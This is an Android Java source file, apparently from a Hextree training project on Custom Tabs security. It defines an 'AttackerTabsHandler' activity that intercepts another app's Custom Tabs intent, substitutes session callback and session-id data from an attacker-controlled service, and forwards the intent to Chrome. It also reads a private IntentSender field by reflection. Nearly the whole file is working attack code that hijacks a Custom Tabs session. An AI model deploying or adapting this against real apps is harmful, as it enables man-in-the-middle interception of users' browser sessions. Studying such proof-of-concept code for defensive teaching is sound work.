package io.hextree.webviews.customtabs;

import static androidx.browser.customtabs.CustomTabsIntent.EXTRA_SESSION;
import static androidx.browser.customtabs.CustomTabsIntent.EXTRA_SESSION_ID;

import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentSender;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.support.customtabs.ICustomTabsCallback;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsCallback;
import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;
import androidx.browser.customtabs.CustomTabsSessionToken;
import androidx.core.app.BundleCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

import io.hextree.webviews.R;
import io.hextree.webviews.Utils;
import io.hextree.webviews.activities.MainActivity;

public class AttackerTabsHandler extends AppCompatActivity {
    String TAG = "AttackerTabsHandler";
    private final HashMap<CustomTabsCallback, CustomTabsSession> sessionMap = new HashMap<>();

    public static Object getMTarger(IntentSender intentSender) {
        try {
            // Get the IntentSender class
            Class<?> intentSenderClass = intentSender.getClass();

            // Locate the private field mTarget
            Field mTargetField = intentSenderClass.getDeclaredField("mTarget");

            // Make the private field accessible
            mTargetField.setAccessible(true);

            // Retrieve the value of mTarget from the intentSender instance
            Object mTarget = mTargetField.get(intentSender);

            return mTarget;
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
            // Handle the case where the field doesn't exist
        } catch (IllegalAccessException e) {
            e.printStackTrace();
            // Handle the case where the field isn't accessible
        } catch (Exception e) {
            e.printStackTrace();
            // Handle any other exceptions
        }

        return null;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_custom_tabs_handler);

        // [1] the intent coming from the app
        Intent app_customTabsIntent = getIntent();

        List<String> packageNames = Arrays.asList(
                "com.google.android.apps.chrome",
                "com.chrome.canary",
                "com.chrome.dev",
                "com.chrome.beta",
                "com.android.chrome"
        );
        String packageName = CustomTabsClient.getPackageName(this, packageNames, true);

        // [2] prepare the intent to be forwarded to chrome
        app_customTabsIntent.setComponent(null);
        app_customTabsIntent.setPackage(packageName);

        // [3] check if the app intent has a session attached
        IBinder app_callback = (IBinder) app_customTabsIntent.getExtras().getBinder(EXTRA_SESSION);
        PendingIntent app_sessionId = (PendingIntent) app_customTabsIntent.getExtras().getParcelable(EXTRA_SESSION_ID);

        CustomTabsSessionToken app_sessionToken = CustomTabsSessionToken.getSessionTokenFromIntent(app_customTabsIntent);

        PendingIntent p = PendingIntent.getActivity(this, 123, new Intent(), PendingIntent.FLAG_IMMUTABLE);
        p.equals(p);
        IntentSender sender = (IntentSender) p.getIntentSender();
        if(app_sessionToken!=null) {
            // Turn chrome_session into an intent to get access to the session info
            CustomTabsSession chrome_session = AttackerTabsService.tokenToSessionMap.get(app_sessionToken);
            Intent chrome_intent = new CustomTabsIntent.Builder(chrome_session).build().intent;


            // extract the chrome session infos
            IBinder attack_callback = chrome_intent.getExtras().getBinder(EXTRA_SESSION);
            PendingIntent chrome_sessionId = (PendingIntent) chrome_intent.getExtras().getParcelable(EXTRA_SESSION_ID);

            // attach session info to the chrome intent
            app_customTabsIntent.getExtras().putBinder(EXTRA_SESSION, attack_callback);
            if (chrome_sessionId != null) {
                app_customTabsIntent.getExtras().putParcelable(EXTRA_SESSION_ID, chrome_sessionId);
            }
        }

        Log.i(TAG, "forward intent to "+packageName);
        Log.i(TAG, Utils.dumpIntent(this, app_customTabsIntent));

        startActivity(app_customTabsIntent);
        finish();

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }
}